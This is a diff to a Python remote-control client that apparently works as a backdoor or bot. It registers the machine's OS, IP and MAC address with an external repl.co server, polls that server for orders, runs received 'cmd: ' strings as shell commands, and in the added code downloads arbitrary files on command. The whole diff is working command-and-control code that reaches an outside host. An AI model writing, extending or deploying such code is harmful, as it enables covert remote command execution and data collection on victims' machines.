@@ -7,14 +7,25 @@ import json
 import os
 import threading
 
-def get_ip_addr():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    lo = (s.getsockname()[0])
-    s.close()
-    return lo
+server_url = "https://practserver.kamakepar.repl.co"
 
-ipaddr = get_ip_addr()
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("8.8.8.8", 80))
+ipaddr = (s.getsockname()[0])
+s.close()
+
+def download_file(url):
+    local_filename = url.split('/')[-1]
+    # NOTE the stream=True parameter below
+    with requests.get(url, stream=True) as r:
+        r.raise_for_status()
+        with open(local_filename, 'wb') as f:
+            for chunk in r.iter_content(chunk_size=8192): 
+                # If you have chunk encoded response uncomment if
+                # and set chunk_size parameter to None.
+                #if chunk: 
+                f.write(chunk)
+    return local_filename
 
 def get_mac_ip(ip):
 	all_nets = netifaces.interfaces()
@@ -50,39 +61,42 @@ try:
 except:
 	conf = {}
 	conf["os"] = platform.system()
-	conf["ip"] = get_ip_addr()
-	conf["mac"] = get_mac_ip(conf["ip"])
-	conf["id"] = r.post("https://practserver.kamakepar.repl.co/get_id_fix_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr}).text
+	conf["ip"] = ipaddr
+	conf["mac"] = macaddr
+	conf["id"] = r.post(server_url+"/get_id_fix_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr}).text
 	f = open('config.json','w')
 	f.write(json.dumps(conf))
 	f.close()
 	pass
 
 while True:
-	to = (r.get('https://practserver.kamakepar.repl.co/approve_me?id='+conf["id"]).text)
+	to = (r.get(server_url+'/approve_me?id='+conf["id"]).text)
 	if to == 'update':
 		ids = conf["id"]
 		conf = {}
 		conf["os"] = platform.system()
-		conf["ip"] = get_ip_addr()
-		conf["mac"] = get_mac_ip(conf["ip"])
-		conf["id"] = r.post("https://practserver.kamakepar.repl.co/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
+		conf["ip"] = ipaddr
+		conf["mac"] = macaddr
+		conf["id"] = r.post(server_url+"/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
 		f = open('config.json','w')
 		f.write(json.dumps(conf))
 		f.close()
-		r.get('https://practserver.kamakepar.repl.co/query_sent?id='+conf["id"]).text
+		r.get(server_url+'/query_sent?id='+conf["id"]).text
 	if to == 'No user':
 		ids = conf["id"]
 		conf = {}
 		conf["os"] = platform.system()
 		conf["ip"] = ipaddr
 		conf["mac"] = macaddr
-		conf["id"] = r.post("https://practserver.kamakepar.repl.co/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
+		conf["id"] = r.post(server_url+"/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
 		f = open('config.json','w')
 		f.write(json.dumps(conf))
 		f.close()
-		r.get('https://practserver.kamakepar.repl.co/query_sent?id='+conf["id"]).text
+		r.get(server_url+'/query_sent?id='+conf["id"]).text
 	if 'cmd: ' in to:
 		t = threading.Thread(target=os.system, args=(to.replace('cmd: ',''),));t.start()
-		r.get('https://practserver.kamakepar.repl.co/query_sent?id='+conf["id"]).text
+		r.get(server_url+'/query_sent?id='+conf["id"]).text
+	if 'download: ' in to:
+		t = threading.Thread(target=download_file, args=(to.replace('download: ',''),));t.start()
+		r.get(server_url+'/query_sent?id='+conf["id"]).text
 	sleep(10)
